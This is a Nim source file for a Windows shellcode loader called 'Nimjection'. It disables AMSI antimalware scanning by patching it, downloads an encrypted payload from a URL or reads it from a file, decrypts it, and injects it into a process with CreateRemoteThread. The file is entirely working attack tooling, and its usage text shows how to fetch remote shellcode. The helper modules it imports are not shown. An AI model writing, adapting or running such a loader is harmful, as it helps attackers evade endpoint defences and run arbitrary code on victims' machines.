import winim/lean
import osproc
import amsipatch
import parseopt
import os
import httprequest
import sequtils
import inject
import decrypt

let argv = commandLineParams()

var
    enkey = ""

if argv == @[]:
  echo "Flags:\n--url\n--file\n--enkey\tencryption key, DEAFULT: Nimjection\n\nUsage:\n./Nimjection.exe  --url:http://127.0.0.1/shellcode\tGet Remote Payload\n./Nimjection.exe --file:\"Local Payload File\"\tGet Local Payload"
else:
    let f = toSeq(getopt())  
    for a in f:
        if a.key == "url":
            var success = PatchAmsi()
            echo "[*] AMSI disabled: ",success

            if f[f.high].key == "enkey":
                enkey = f[f.high].val
            else:
                echo "No encryption key set...."
                break
            
            echo "Grabbing payload from: " & a.val
            echo "Decrypting payload..."
            injectCreateRemoteThread(decrypt(enkey, httpRequest(a.val)))
            break

        elif a.key == "file":
            var success = PatchAmsi()
            echo "[*] AMSI disabled: ",success

            if f[f.high].key == "enkey":
                enkey = f[f.high].val
            else:
                echo "No encryption key set...."
                break

            echo "Grabbing payload from: " & a.val
            echo "Decrypting payload..."
            
            injectCreateRemoteThread(decrypt(enkey,readFile(a.val)))
            break
        else:
            echo "unknown command line argument: " & a.key
            break


